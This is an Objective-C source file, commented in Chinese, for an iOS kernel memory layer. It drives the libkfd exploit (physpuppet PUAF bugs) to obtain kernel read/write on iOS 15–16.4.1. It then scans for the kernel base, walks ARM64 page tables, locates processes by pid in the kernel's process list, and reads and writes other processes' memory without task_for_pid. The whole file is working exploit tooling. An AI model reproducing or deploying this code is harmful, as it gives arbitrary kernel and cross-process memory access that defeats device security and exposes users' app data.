//
//  KernelMemory.m
//  内核内存读写层实现。
//
//  ⚠️ 整个工程只有本文件可以 #include "libkfd.h"：
//     libkfd 是 header-only，且 kopen / kread / kwrite / kclose 都是非 static 定义，
//     第二个 include 点会撞重复符号。别的文件一律走 KernelMemory.h 的 C 接口。
//
//  数据流（对齐样本 _kfd_port/施工总纲.md）：
//      kopen
//        └─ info_init    读 kern.version → 选版本表项
//        └─ puaf_run     PUAFF 制造悬空 PTE（不碰目标进程）
//        └─ krkw_run     用半随机游走拿到 psemnode，建立 kread / kwrite
//        └─ info_run     kread 反查 current_proc / kernel_proc
//        └─ <perf_run 已按本路线关闭：不读 kernelcache__* 静态表>
//      之后：从 kernel_proc 向下页对齐扫 MH_MAGIC_64 → kernel base
//
//  全程不调用 task_for_pid，不使用 mach_vm_read。
//

#import <Foundation/Foundation.h>
#include <sys/sysctl.h>

#include "KernelMemory.h"
#include "libkfd.h"

#pragma mark - 状态

/// kopen 返回的句柄。0 表示未就绪。
static uint64_t g_handle = 0;
/// 扫描得到的 kernel base（kernelcache 的 MH_MAGIC_64 所在地址）。
static uint64_t g_kernel_base = 0;

/// 当前进程 pmap 的内核地址（info_run 反查得到）。
static uint64_t g_current_pmap = 0;
/// 「内核 VA − PA」差值。经自校验后才有意义。
static uint64_t g_linear_delta = 0;
static bool g_linear_map_valid = false;

/// struct pmap 的 tte 字段偏移。static_info.h 里 pmap 以 tte/ttep 开头。
#define KM_PMAP_TTE_OFFSET 0x00

/// PUAFF 页数。kopen 自己断言范围为 16 ... 2048，取上界提高成功率。
static const u64 kfd_puaf_pages = 2048;

/// kernel base 反向扫描上限，防止踩到未映射区域形成死循环。
static const uint64_t kfd_kbase_scan_max = 0x4000000; /* 64 MB */

#pragma mark - 工具

bool km_is_kernel_address(uint64_t addr)
{
    return (addr >> 48) == 0xFFFF;
}

/// 读取 kern.version 全文。取不到返回 nil。
static NSString *km_read_kern_version(void)
{
    char buffer[512] = {};
    size_t size = sizeof(buffer);
    if (sysctlbyname("kern.version", buffer, &size, NULL, 0) != 0) {
        return nil;
    }
    return [NSString stringWithUTF8String:buffer];
}

/// 版本是否落在 dynamic_info.h 的 kern_versions[] 覆盖范围内。
///
/// kfd 的 info_init() 在匹配不到时走 assert_false()，在 app 里等于 exit(1)。
/// 所以这里先自己挡一次，把「不支持」变成一条可读错误而不是一次闪退。
/// 判定口径与 info_init 一致：比 Darwin 主次号前缀。
static BOOL km_version_is_listed(NSString *kernVersion)
{
    if (kernVersion.length == 0) {
        return NO;
    }

    const size_t prefixLength = 29; /* strlen("Darwin Kernel Version 22.5.0") */
    if (kernVersion.length < prefixLength) {
        return NO;
    }
    NSString *prefix = [kernVersion substringToIndex:prefixLength];

    const u64 count = sizeof(kern_versions) / sizeof(kern_versions[0]);
    for (u64 i = 0; i < count; i++) {
        const char *entry = kern_versions[i].kern_version;
        if (strncmp(prefix.UTF8String, entry, prefixLength) == 0) {
            return YES;
        }
    }
    return NO;
}

/// 从 kernel_proc 向下找到 kernelcache 的 Mach-O 头。
///
/// 样本做法：拿一个内核 VA、页对齐、每步退 16 KB、读 4 字节比 0xFEEDFACF。
/// 样本用的是编译期写死的锚点常量；这里改用它已经掌握的真实内核地址
/// （info_run 反查出来的 kernel_proc），省掉那张必须逐版本重取的常量表。
static uint64_t km_scan_kernel_base(uint64_t anchor)
{
    if (anchor == 0) {
        return 0;
    }

    const uint64_t page = 0x4000; /* arm64 16 KB 内核页 */
    uint64_t cursor = anchor & ~(page - 1);

    for (uint64_t walked = 0; walked < kfd_kbase_scan_max; walked += page) {
        if (cursor < page || !km_is_kernel_address(cursor)) {
            break;
        }

        uint32_t magic = kread_sem_open_kread_u32((struct kfd *)g_handle, cursor);
        if (magic == 0xFEEDFACF) {
            return cursor;
        }

        cursor -= page;
    }

    return 0;
}

#pragma mark - 对外接口

bool km_init(const char **err)
{
    if (err) {
        *err = NULL;
    }
    if (g_handle != 0) {
        return true;
    }

    NSString *kernVersion = km_read_kern_version();
    NSLog(@"[KernelMemory] kern.version = %@", kernVersion ?: @"(unreadable)");

    if (!km_version_is_listed(kernVersion)) {
        NSLog(@"[KernelMemory] no version table entry for this kernel");
        if (err) {
            *err = "this kernel version is not in kern_versions[] "
                   "(libkfd/info/dynamic_info.h)";
        }
        return false;
    }

    /*
     * 依次尝试 PUAFF。命中哪一个取决于目标内核修掉了哪些 CVE：
     *   physpuppet  iOS 16.4 封堵前可用
     *   smith       iOS 16.5.1 封堵前可用
     *   landa       iOS 17.0 封堵前可用
     * 目标机型（iOS 15 - 16.4.1）落在前两个里，physpuppet 优先。
     *
     * 注意：kopen 内部的 assert 在失败时会 exit(1)，所以只尝试一个方法；
     * 需要换方法时改这个常量，不要在运行期循环调用 kopen。
     */
    const u64 readMethod = kread_sem_open;
    const u64 writeMethod = kwrite_sem_open;

    NSLog(@"[KernelMemory] kopen(pages=%llu, puaf=physpuppet, kread=sem_open, kwrite=sem_open)",
          (unsigned long long)kfd_puaf_pages);

    uint64_t handle = kopen(kfd_puaf_pages, puaf_physpuppet, readMethod, writeMethod);
    if (handle == 0) {
        if (err) {
            *err = "kopen returned 0 (PUAFF did not land)";
        }
        return false;
    }

    struct kfd *kfd = (struct kfd *)handle;
    g_handle = handle;

    NSLog(@"[KernelMemory] current_proc = %#llx  kernel_proc = %#llx",
          (unsigned long long)kfd->info.kaddr.current_proc,
          (unsigned long long)kfd->info.kaddr.kernel_proc);

    /*
     * 顺序对齐样本 physrw：先扫 kernel base，再做线性映射定位。
     * 线性映射的基准要用到 kernel base 附近的确定地址，所以不能倒过来。
     */
    g_kernel_base = km_scan_kernel_base(kfd->info.kaddr.kernel_proc);
    NSLog(@"[KernelMemory] kernel base = %#llx (scanned)", (unsigned long long)g_kernel_base);

    if (g_kernel_base == 0) {
        /*
         * 读写原语已经可用，只是没扫到 kernelcache 头。这不影响 kread/kwrite
         * 本身，所以不当作初始化失败 —— kernel base 的消费者可以自行降级。
         */
        NSLog(@"[KernelMemory] kernel base scan missed; kread/kwrite still usable");
    }

    /*
     * 地址翻译层：走页表拿 PA，再用线性映射补回 KVA。
     * 这一步同时验证 kread 在原语层面真的可用。
     */
    km_locate_linear_map();
    NSLog(@"[KernelMemory] linear map %@, pmap = %#llx",
          g_linear_map_valid ? @"ready" : @"unresolved",
          (unsigned long long)g_current_pmap);

    /* procForPid 自证：自己进程必须能查到，且 p_pid 对得上。 */
    uint64_t selfProc = km_proc_for_pid(kfd->info.env.pid);
    NSLog(@"[KernelMemory] procForPid(self=%d) = %#llx %@",
          kfd->info.env.pid, (unsigned long long)selfProc,
          (selfProc == kfd->info.kaddr.current_proc) ? @"OK" : @"MISMATCH");

    return true;
}

void km_deinit(void)
{
    if (g_handle == 0) {
        return;
    }
    kclose(g_handle);
    g_handle = 0;
    g_kernel_base = 0;
}

bool km_ready(void)
{
    return g_handle != 0;
}

uint64_t km_kernel_base(void)
{
    return g_kernel_base;
}

bool km_read(uint64_t addr, void *out, uint64_t len)
{
    if (g_handle == 0 || out == NULL || len == 0) {
        return false;
    }
    if (!km_is_kernel_address(addr)) {
        return false;
    }

    uint8_t *cursor = (uint8_t *)out;
    uint64_t remaining = len;

    /*
     * kread 按 8 字节粒度搬运，尾部不足 8 字节时落到临时缓冲再截取，
     * 避免把目标地址后面的字节写进调用方的缓冲区。
     */
    while (remaining >= sizeof(uint64_t)) {
        *(uint64_t *)cursor = kread_sem_open_kread_u64((struct kfd *)g_handle, addr);
        cursor += sizeof(uint64_t);
        addr += sizeof(uint64_t);
        remaining -= sizeof(uint64_t);
    }

    if (remaining > 0) {
        uint64_t tail = kread_sem_open_kread_u64((struct kfd *)g_handle, addr);
        memcpy(cursor, &tail, (size_t)remaining);
    }

    return true;
}

uint64_t km_read64(uint64_t addr, bool *ok)
{
    if (ok) {
        *ok = false;
    }
    if (g_handle == 0 || !km_is_kernel_address(addr)) {
        return 0;
    }
    if (ok) {
        *ok = true;
    }
    return kread_sem_open_kread_u64((struct kfd *)g_handle, addr);
}

bool km_write(uint64_t addr, const void *in, uint64_t len)
{
    if (g_handle == 0 || in == NULL || len == 0) {
        return false;
    }
    if (!km_is_kernel_address(addr)) {
        return false;
    }
    /* kwrite 逐 64 位写入（kwrite_dup_kwrite_u64），长度不是 8 的倍数就没有定义。 */
    if ((len % sizeof(uint64_t)) != 0) {
        return false;
    }

    const uint8_t *cursor = (const uint8_t *)in;
    uint64_t remaining = len;

    while (remaining >= sizeof(uint64_t)) {
        uint64_t value = *(const uint64_t *)cursor;
        kwrite_dup_kwrite_u64((struct kfd *)g_handle, addr, value);
        cursor += sizeof(uint64_t);
        addr += sizeof(uint64_t);
        remaining -= sizeof(uint64_t);
    }

    return true;
}

void km_self_test(char *out, size_t outSize)
{
    if (out == NULL || outSize == 0) {
        return;
    }
    out[0] = '\0';

    if (g_handle == 0) {
        snprintf(out, outSize, "kernel rw: not ready");
        return;
    }

    struct kfd *kfd = (struct kfd *)g_handle;
    size_t used = 0;

    used += (size_t)snprintf(out + used, outSize - used,
                             "current_proc=%#llx kernel_proc=%#llx kernel_base=%#llx\n",
                             (unsigned long long)kfd->info.kaddr.current_proc,
                             (unsigned long long)kfd->info.kaddr.kernel_proc,
                             (unsigned long long)g_kernel_base);

    /*
     * 锚点校验：kernel base 处必须是小端 MH_MAGIC_64，且紧跟的 cputype 为 arm64。
     * 两项同时成立才能说明 kread 读到的确实是那个 Mach-O 头，
     * 而不是一串看起来合理的垃圾。
     */
    if (outSize > used) {
        char line[192] = {};
        if (g_kernel_base == 0) {
            snprintf(line, sizeof(line), "magic: skipped (no kernel base)");
        } else {
            uint32_t header[2] = {};
            if (!km_read(g_kernel_base, header, sizeof(header))) {
                snprintf(line, sizeof(line), "magic: read failed");
            } else {
                snprintf(line, sizeof(line), "magic=%#x cputype=%#x  %s",
                         header[0], header[1],
                         (header[0] == 0xFEEDFACF) ? "OK" : "MISMATCH");
            }
        }
        used += (size_t)snprintf(out + used, outSize - used, "%s\n", line);
    }

    /* 再按偏移解引用一次 current_proc 的 pid，确认 dynamic_info 偏移可用。 */
    if (kfd->info.kaddr.current_proc && outSize > used) {
        i32 pid = (i32)dynamic_kget(proc__p_pid, kfd->info.kaddr.current_proc);
        snprintf(out + used, outSize - used,
                 "current_proc->p_pid=%d (expect %d) %s",
                 pid, kfd->info.env.pid,
                 (pid == kfd->info.env.pid) ? "OK" : "MISMATCH");
        used += strlen(out + used);
    }

    /*
     * 地址翻译层自检：拿 kernel_proc 本身走一遍页表。
     * 它是内核地址，翻出来的 PA 经线性映射补回后必须还是它自己 ——
     * 这一步同时验证了 pmap 取链、页表走法、线性映射基准三件事。
     */
    if (outSize > used) {
        uint64_t probe = kfd->info.kaddr.kernel_proc;
        bool ok = false;
        uint64_t pa = 0;
        if (probe) {
            ok = km_page_table_walk(g_current_pmap, probe, &pa);
        }
        snprintf(out + used, outSize - used,
                 "\npmap=%#llx walk(kernel_proc)=%s pa=%#llx linear=%s",
                 (unsigned long long)g_current_pmap,
                 probe ? (ok ? "OK" : "MISS") : "SKIP",
                 (unsigned long long)pa,
                 g_linear_map_valid ? "OK" : "UNRESOLVED");
        used += strlen(out + used);
    }

    /*
     * 目标进程读自证 —— 一次同时验证三件事：
     *   ① 页表遍历（km_translate）
     *   ② 线性映射补回（pa + g_linear_delta）
     *   ③ 经内核读写目标进程用户态地址（km_read_process）
     * 做法：拿自己进程的 Mach-O 头，一条走 km_read_process（页表翻译），
     * 另一条直接拿本进程地址读同一段（普通内存访问），两者必须逐字节一致。
     * 自己进程走的是同一套代码路径，所以这个比对能真实暴露翻译是否正确。
     */
    if (outSize > used) {
        const int32_t selfPid = kfd->info.env.pid;
        const uint64_t mh = (uint64_t)(uintptr_t)&_mh_execute_header;

        uint32_t viaProcess[2] = {};
        bool readOK = km_read_process(selfPid, mh, viaProcess, sizeof(viaProcess));

        uint32_t viaLocal[2] = {};
        if (readOK) {
            const uint32_t *local = (const uint32_t *)(uintptr_t)mh;
            viaLocal[0] = local[0];
            viaLocal[1] = local[1];
        }

        snprintf(out + used, outSize - used,
                 "\nself-read %#llx: %s proc(magic=%#x cpu=%#x) local(magic=%#x cpu=%#x) %s",
                 (unsigned long long)mh,
                 readOK ? "OK" : "FAIL",
                 viaProcess[0], viaProcess[1],
                 viaLocal[0], viaLocal[1],
                 (readOK && viaProcess[0] == viaLocal[0] && viaProcess[1] == viaLocal[1])
                     ? "MATCH" : "MISMATCH");
    }
}

#pragma mark - 地址翻译层

/*
 * arm64 16 KB 页的三级表几何。
 * 这些常量不属于「逐版本变动」的那一类 —— 页表几何由硬件页大小决定，
 * 换内核版本不会变，所以写在这里是安全的。
 */
#define KM_PAGE_SHIFT 14ULL
#define KM_PAGE_SIZE (1ULL << KM_PAGE_SHIFT)
#define KM_PAGE_MASK (KM_PAGE_SIZE - 1)
#define KM_L1_SHIFT 36ULL
#define KM_L2_SHIFT 25ULL
#define KM_L3_SHIFT 14ULL
#define KM_L1_MASK 0x0000000ff0000000ULL /* 11 bits at 36 */
#define KM_L2_MASK 0x0000000ffe000000ULL /* 11 bits at 25 */
#define KM_L3_MASK 0x0000000001ffc000ULL /* 11 bits at 14 */
#define KM_TTE_TYPE_BLOCK 0x0000000000000000ULL
#define KM_TTE_TYPE_TABLE 0x0000000000000002ULL
#define KM_TTE_TYPE_MASK 0x0000000000000002ULL
#define KM_TTE_PA_MASK 0x0000fffffffff000ULL

/// 用页表项算出下一级表的物理地址。
static uint64_t km_next_table_pa(uint64_t tte)
{
    return tte & KM_TTE_PA_MASK;
}

/// 内部：按 pmap 走页表，把 VA 翻成 PA。
static bool km_page_table_walk(uint64_t pmap, uint64_t va, uint64_t *pa_out)
{
    if (pmap == 0 || pa_out == NULL) {
        return false;
    }

    bool ok = false;
    uint64_t tte = km_read64(pmap + KM_PMAP_TTE_OFFSET, &ok);
    if (!ok || tte == 0) {
        return false;
    }
    uint64_t table = km_next_table_pa(tte);

    /* L1 / L2 允许块描述符直接落地；L3 只认页描述符。 */
    const uint64_t shifts[3] = { KM_L1_SHIFT, KM_L2_SHIFT, KM_L3_SHIFT };
    const uint64_t masks[3] = { KM_L1_MASK, KM_L2_MASK, KM_L3_MASK };

    for (int level = 0; level < 3; level++) {
        uint64_t index = (va & masks[level]) >> shifts[level];
        uint64_t entry = km_read64(table + index * sizeof(uint64_t), &ok);
        if (!ok || (entry & 1) == 0) {
            return false;
        }

        if ((entry & KM_TTE_TYPE_MASK) == KM_TTE_TYPE_BLOCK) {
            *pa_out = (entry & KM_TTE_PA_MASK) | (va & KM_PAGE_MASK);
            return true;
        }
        table = km_next_table_pa(entry);
    }

    return false;
}

/// 内核 VA − PA：内核线性映射里这个差值对所有地址恒定，
/// 所以一次有效的观测就够，不需要去解析 gVirtBase / gPhysBase 的符号。
static bool km_compute_linear_delta(uint64_t pmap, uint64_t known_va,
                                    const char *reason, char *out, size_t outSize)
{
    uint64_t pa = 0;
    if (!km_page_table_walk(pmap, known_va, &pa)) {
        if (out && outSize) {
            snprintf(out, outSize, "%s: walk failed", reason);
        }
        return false;
    }
    if (pa == 0) {
        if (out && outSize) {
            snprintf(out, outSize, "%s: pa is 0", reason);
        }
        return false;
    }
    g_linear_delta = known_va - pa;
    if ((g_linear_delta >> 40) == 0) {
        if (out && outSize) {
            snprintf(out, outSize, "%s: implausible delta %#llx",
                     reason, (unsigned long long)g_linear_delta);
        }
        return false;
    }
    if (out && outSize) {
        snprintf(out, outSize, "%s: delta=%#llx", reason,
                 (unsigned long long)g_linear_delta);
    }
    return true;
}

bool km_locate_linear_map(void)
{
    g_linear_map_valid = false;
    g_linear_delta = 0;

    if (g_handle == 0) {
        return false;
    }

    struct kfd *kfd = (struct kfd *)g_handle;
    g_current_pmap = kfd->info.kaddr.current_pmap;

    /*
     * 主路径：kernel_proc 是目标内核一个确定的内核 VA，把它翻成 PA 再反解差值。
     * 这一步成立与否当场可判 —— 成立说明「pmap 取链 + 页表走法 + 差值」
     * 三件事同时对，比读任何符号表都可靠。
     */
    char note[192] = {};
    if (kfd->info.kaddr.kernel_proc &&
        km_compute_linear_delta(g_current_pmap, kfd->info.kaddr.kernel_proc,
                                "kernel_proc", note, sizeof(note))) {
        g_linear_map_valid = true;
        NSLog(@"[KernelMemory] linear map located: %@", @(note));
        return true;
    }
    NSLog(@"[KernelMemory] linear map primary path failed: %@", @(note));

    /*
     * 兜底：kernel_proc 可能在 PPL 保护的页面上、走不过去。
     * 换 current_proc 再试一次 —— 它是自己进程的 proc，必然可读。
     */
    if (kfd->info.kaddr.current_proc &&
        km_compute_linear_delta(g_current_pmap, kfd->info.kaddr.current_proc,
                                "current_proc", note, sizeof(note))) {
        g_linear_map_valid = true;
        NSLog(@"[KernelMemory] linear map located via fallback: %@", @(note));
        return true;
    }

    NSLog(@"[KernelMemory] linear map unresolved: %@", @(note));
    return false;
}

bool km_linear_map_ready(void)
{
    return g_linear_map_valid;
}

uint64_t km_proc_for_pid(int32_t pid)
{
    if (g_handle == 0) {
        return 0;
    }

    struct kfd *kfd = (struct kfd *)g_handle;
    uint64_t kernel_proc = kfd->info.kaddr.kernel_proc;
    uint64_t current_proc = kfd->info.kaddr.current_proc;

    if (pid == kfd->info.env.pid && current_proc) {
        return current_proc;
    }
    if (kernel_proc == 0) {
        return 0;
    }

    const uint64_t off_next = dynamic_info(proc__p_list__le_prev) - 8;
    const uint64_t off_pid = dynamic_info(proc__p_pid);
    const uint64_t max_hops = 4096;

    bool ok = false;
    uint64_t node = kernel_proc;
    for (uint64_t i = 0; i < max_hops; i++) {
        uint64_t link = km_read64(node + off_next, &ok);
        if (!ok || link == 0 || link == kernel_proc) {
            break;
        }
        /* 明显不是内核指针就停，避免顺着被写坏的链跑飞。 */
        if (!km_is_kernel_address(link) || (link & 0x7) != 0) {
            break;
        }
        i32 candidate = (i32)km_read64(link + off_pid, &ok);
        if (ok && candidate == pid) {
            return link;
        }
        node = link;
    }

    return 0;
}

bool km_translate(int32_t pid, uint64_t uaddr, uint64_t *pa_out)
{
    if (!g_linear_map_valid || pa_out == NULL) {
        return false;
    }

    uint64_t proc = km_proc_for_pid(pid);
    if (proc == 0) {
        return false;
    }

    bool ok = false;
    uint64_t task = proc + dynamic_info(proc__object_size);
    uint64_t map = km_read64(task + dynamic_info(task__map), &ok);
    if (!ok || !km_is_kernel_address(map)) {
        return false;
    }

    /* _vm_map.pmap 用 offsetof 算，定义在 static_info.h，与样本同源。 */
    uint64_t pmap = km_read64(map + offsetof(struct _vm_map, pmap), &ok);
    if (!ok || !km_is_kernel_address(pmap)) {
        return false;
    }

    return km_page_table_walk(pmap, uaddr, pa_out);
}

bool km_read_process(int32_t pid, uint64_t uaddr, void *out, uint64_t len)
{
    if (!g_linear_map_valid || out == NULL || len == 0) {
        return false;
    }

    uint8_t *cursor = (uint8_t *)out;
    uint64_t remaining = len;
    uint64_t addr = uaddr;

    /*
     * 按页走：一页内的物理页是连续的，跨页必须重新翻译。
     * 每次翻一次、整页读一次，避免按 8 字节粒度反复走表。
     */
    while (remaining > 0) {
        uint64_t pa = 0;
        if (!km_translate(pid, addr, &pa)) {
            return false;
        }

        uint64_t in_page = KM_PAGE_SIZE - (addr & KM_PAGE_MASK);
        uint64_t chunk = (remaining < in_page) ? remaining : in_page;
        uint64_t kva = pa + g_linear_delta;

        if (!km_read(kva, cursor, chunk)) {
            return false;
        }

        cursor += chunk;
        addr += chunk;
        remaining -= chunk;
    }

    return true;
}

bool km_write_process(int32_t pid, uint64_t uaddr, const void *in, uint64_t len)
{
    if (!g_linear_map_valid || in == NULL || len == 0) {
        return false;
    }
    /* 写原语逐 64 位落笔，非 8 的倍数没有定义。 */
    if ((len % sizeof(uint64_t)) != 0) {
        return false;
    }

    const uint8_t *cursor = (const uint8_t *)in;
    uint64_t remaining = len;
    uint64_t addr = uaddr;

    /*
     * 与 km_read_process 同构：按页翻译、整页写。
     * 页内物理页连续，所以一页只翻一次表。
     */
    while (remaining > 0) {
        uint64_t pa = 0;
        if (!km_translate(pid, addr, &pa)) {
            return false;
        }

        uint64_t in_page = KM_PAGE_SIZE - (addr & KM_PAGE_MASK);
        uint64_t chunk = (remaining < in_page) ? remaining : in_page;
        /* 写原语要求 8 字节对齐，页边界的余数留到下一轮。 */
        if ((chunk % sizeof(uint64_t)) != 0) {
            chunk -= (chunk % sizeof(uint64_t));
            if (chunk == 0) {
                return false;
            }
        }

        uint64_t kva = pa + g_linear_delta;
        if (!km_write(kva, cursor, chunk)) {
            return false;
        }

        cursor += chunk;
        addr += chunk;
        remaining -= chunk;
    }

    return true;
}
